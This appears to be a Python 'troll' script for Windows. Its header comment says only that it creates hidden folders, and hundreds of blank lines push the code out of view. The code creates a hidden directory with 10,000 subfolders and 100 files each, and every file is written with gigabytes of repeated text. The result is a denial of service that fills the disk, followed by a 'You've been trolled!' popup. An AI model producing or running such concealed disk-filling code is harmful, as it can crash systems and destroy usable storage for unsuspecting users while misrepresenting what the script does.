import os
from tkinter import messagebox
import ctypes




# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!
# THIS FILE CREATES FOLDERS AND FILE THAT ARE NOT VISIBLE UNLESS YOU TURN ON THE 'HIDEN ITEMS' OPTION IN YOUR SETTINGS!




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































def main(base_path):
    create_mainfolder(base_path)
    create_secondary_folders(base_path)
    messagebox.showinfo("Success", "You've been trolled!")


def create_mainfolder(base_path):
    if os.path.exists(base_path):
        print("\n'BeansFolders' folder already exists")
        pass
    else:
        print("\nCreating folder...")
        os.makedirs(base_path)
        # Set the folder attribute to hidden
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ret = ctypes.windll.kernel32.SetFileAttributesW(base_path, FILE_ATTRIBUTE_HIDDEN)
        if ret:
            print("'BeansFolders' folder created and hidden\n")
            pass
        else:
            
            error = ctypes.GetLastError()
            print(f"\nFailed to hide 'BeansFolders' folder. Error code: {error}")

def create_secondary_folders(base_path):
    for folder_num in range(1, 10001):
        folder_path = os.path.join(base_path, f'Beans_{folder_num}')
        os.makedirs(folder_path, exist_ok=True)
        
        print(f"\nFolders created:\n [{folder_num}/10000]")
        create_files(base_path, folder_num)

def create_files(base_path, folder_num):
    folder_path = os.path.join(base_path, f'Beans_{folder_num}')
    print("\nCreating files...")
    for file_num in range(1, 101):
        file_path = os.path.join(folder_path, f'Beans_{file_num}.txt')
        with open(file_path, 'w') as file:
            file.write('Beans\n' * 1000000000)
            if file_num < 10:
                print(f" [00{file_num}/100]")
            elif file_num < 100:
                print(f" [0{file_num}/100]")
            else:
                print(f" [{file_num}/100]")

def startup():
    main('BeansFolders')

if __name__ == '__main__':

    startup()


# Pretty confusing, huh?